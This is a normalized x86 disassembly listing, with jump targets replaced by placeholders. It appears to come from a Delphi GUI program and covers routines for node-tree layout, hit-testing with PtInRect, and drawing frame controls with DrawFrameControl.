mov [ fs : eax ] edx
push sub_443273
mov eax [ ebp - 0x4 ]
call sub_443334
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_43da4c
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_443273
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_445104
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4432c8
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_444334
mov eax [ esi + 0x10 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_443348
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_443348
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_443348
pop ecx
sub_4433a0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_443348
pop ecx
sub_4433cc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4433cc
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4433cc
pop ecx
sub_443420
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_4433a0
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_442c8c
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_442c8c
push eax
mov edx 0x1
mov eax ebx
call sub_442c20
push eax
mov edx 0x2
mov eax ebx
call sub_442c20
pop edx
pop ecx
call sub_412c08
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b98
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4434a4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_442edc
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412c08
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439f30
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_442b08
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4433a0
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_442b2c
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_4443cc
mov edx esi
mov eax ebx
call sub_4433a0
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43a514
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_442b08
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43a500
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_442c8c
mov edx eax
mov eax edi
call sub_44307c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_442c8c
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_442c8c
mov edx eax
mov eax edi
call sub_44307c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_442c8c
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4436b4
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_44385c
jmp r-xdata
sub_4436b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_442b08
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_443054
mov edx eax
mov eax ebx
call sub_44307c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_44307c
mov eax [ esi + 0x64 ]
call sub_443054
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_444724
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_443408
mov eax [ esi + 0x64 ]
call sub_443054
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_444724
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_443408
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_444aa8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_443408
mov eax [ esi + 0x64 ]
call sub_443054
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_444bdc
xor edx edx
mov eax esi
call sub_443408
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_44307c
adc edx 0x0
mov eax ebx
call sub_442d3c
mov eax ebx
call sub_4430cc
push esi
push sub_444bdc
xor edx edx
mov eax esi
call sub_443408
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_44385c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_442d3c
mov eax [ ebx + 0x14 ]
call sub_4430cc
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_4438d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_443054
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_443054
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_443054
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_442c20
mov esi eax
mov edx 0x2
mov eax ebx
call sub_442c20
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_443054
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_44312c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_443154
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44312c
call sub_4438d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_443154
call sub_4438d4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_442c8c
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_442c8c
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_443b00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43da88
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43da4c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412bb8
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443b94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_443b00
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_443154
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4433a0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_443154
call sub_4438d4
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_443c1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403ee8
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404534
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_443c64
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_443e5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_444334
mov eax [ ebp - 0x8 ]
call sub_443330
xor edx edx
push ebp
push sub_443e3f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e46
mov eax [ ebp - 0x8 ]
call sub_443334
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_442b08
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_443c1c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403394
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_442e28
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_443c1c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43a490
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43b270
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403198
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_443e6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412be0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dd60
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443ec4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41d310
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41da94
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41da34
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41da34
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41d310
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41da34
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41da34
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_443f4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_443e6c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_443ec4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_443ec4
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_443e6c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_443ec4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_443ec4
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_444028
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44417e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43914c
mov eax [ ebp - 0x4 ]
call sub_41da6c
xor eax eax
push ebp
push sub_444161
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41dde0
xor eax eax
push ebp
push sub_444144
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_43da88
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44414b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41dde0
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_43da4c
mov ebx eax
